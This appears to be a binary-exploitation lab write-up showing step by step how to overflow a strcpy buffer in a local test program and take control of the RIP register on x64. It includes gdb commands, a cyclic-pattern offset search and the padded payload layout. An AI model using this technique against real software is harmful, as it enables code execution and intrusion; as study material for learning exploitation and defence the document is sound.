strcpy function is dangerous as it does not provide bounds checking
here it is copying the user argument 1 into the local variable named buffer
since there is no bounds check, we have a buffer overflow

The -D FORTIFY_SOURCE=0 flag is a compiler option used with GCC (GNU Compiler Collection) and some
other compilers to disable certain security features related to buffer overflows in C programs.

By disabling FORTIFY_SOURCE, you're turning off compiler-provided checks and runtime protections
against buffer overflows

if we are not getting core dump file then run

```sh
ulimit -c unlimited
```

Open core in gdb(I am using gef)

```sh
gdb-gef -core core
```

```sh
#0  0x0000000000401182 in ?? ()
```

This is the first line of output in gdb, this is the address at which crash occured

Lets check the registers

```sh
info registers
```

```sh
rip            0x401182            0x401182
rbp            0x4141414141414141  0x4141414141414141

```

The content of RIP is exactly the address at which crash occured(makes sense) but if we see the rbp registers
Its 0x414141 which translates to 'AAAA' in hex
But why does RIP not contain 0x414141, lets solve this mystery/

Lets load the binary in gdb

Lets run the program inside gdb
Lets first put a break point at start of main function

```sh
break main
run $(cat payload)
```

Now the rip is pointing at main function

when the strcpy functions copies data of size 300 bytes into buffer of size 256 bytes, it will cause a buffer
overflow. The vuln() function has to return to main function after it has been called by here in this case
because of the buffer overflow, the return address will be overwritten and we will get control of the rip
register

Lets setup a break point at 'ret' instruction inside vuln() function
continue with the execution, press 'c'
Now if we check the registers and stack, we can see our input in these
But rip still does not contain what we are expecting, that is 0x4141414141414141
We are unable to overwrite RIP register, so how do we get the offset to the RIP register
To see the virtual memory of our process

```sh
vmmap
```

cannonical addess = 0x0000000000000000 to 0x00007FFFFFFFFFFF
non-canonical address = 0x0000800000000000 to 0xFFFF7FFFFFFFFFFF

In 64 bit binaries, we can only use the cannonical address, but when we are trying to overwrite 'rip' we are
basically overwriting the all the bytes so we are entering non-canonical address.

**_In cannonical address, the first 4 hex values are always 0(first 2 bytes)_**
We cannot have all the 64 bits set on the address, we can only set the lower 48 bits
**_non-canonical address only used by the kernel_**

So we can only overwrite the 'rip' register with 6bytes and not 8 bytes because we need to use cannonical
memory address
Lets update our exploit, but even if we want to write 6bytes into the 'rip' we need to knwo the offset
For that we can use 'rbp' register as out intermediate register, find out offset to 'rbp' register and from that
point enter 6bytes that will enter the 'rip'
Lets use cyclic pattern to find the offset ot 'rbp'

Put the cyclic pattern in a new file, call it payload2

Set up break points at main() function and 'ret' instruction of vuln() function and once that is done run the
binary and continue the execution till when it reaches breakpoint number 2 at the 'ret' instruction

```sh
$rbp   : 0x636161706361616f ("oaacpaac"?)
$rip   : 0x0000000000401182  →  <vuln_func+002d> ret
```

'rip' still not overwritten but 'rbp' is overwritten
This is the content of 'rbp', lets find the offset then using

```sh
cyclic -l oaacpaac
```

The offset is 256 bytes to reach 'rbp'
So 256bytes to reach 'rbp', next 8bytes will overwrite the 'rbp' and then we need 6bytes to overwrite the
'rip'

Lets create new payload with 256\*A and 8\*B and 6\*C

Run the binary with our new payload
Again same procedure to setup breakpoints

```sh
$rsp   : 0x00007fffffffda88  →  0x0000434343434343 ("CCCCCC"?)
$rbp   : 0x4242424242424242 ("BBBBBBBB"?)
$rsi   : 0x00007fffffffe07f  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCC"
$rdi   : 0x00007fffffffda61  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCC"
$rip   : 0x0000000000401182  →  <vuln_func+002d> ret
```

currently we are at ret instruction and still no '0x43434343' that is 'CCCCCC' in our RIP
So when the ret instruction is executed, behind the scenes it performs 'pop rip' so the value
at the top of the stack, that is the value in 'rsp' register will be popped into 'rip'

```sh
0x00007fffffffda88│+0x0000: 0x0000434343434343 ("CCCCCC"?)       ← $rsp
0x00007fffffffda90│+0x0008: 0x00007fffffffdbb8  →  0x00007fffffffdf6d  →  "/home/kali/x64-BinaryExploitation/simpleBOF/vuln"
0x00007fffffffda98│+0x0010: 0x00000002f7ffdab0
0x00007fffffffdaa0│+0x0018: 0x0000000000000002
```

This is the stack currently and we can see that 0x43434343 is at the top so when the ret instruction is
executed, that value will be popped into the RIP
We can confirm it by typing

```sh
si
```

to execute single instruction

```sh
$rip   : 0x434343434343
[!] Cannot access memory at address 0x434343434343
```

And we have successfully overwritten the rip register
